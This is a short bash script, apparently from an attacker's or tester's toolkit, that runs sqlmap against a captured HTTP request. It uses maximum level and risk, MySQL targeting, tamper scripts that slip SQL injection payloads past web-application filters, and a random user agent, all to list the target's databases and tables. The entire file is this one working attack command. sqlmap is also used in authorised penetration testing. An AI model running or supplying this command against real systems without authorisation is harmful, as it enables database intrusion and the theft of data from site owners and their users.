#!/bin/bash

python /var/www/exploit/sqlmap/sqlmap.py -r "$1" --dbs --tables --level=5 --risk=3 --threads=5 --dbms=mysql -v 3 --tamper="between,randomcase,space2comment" --random-agent
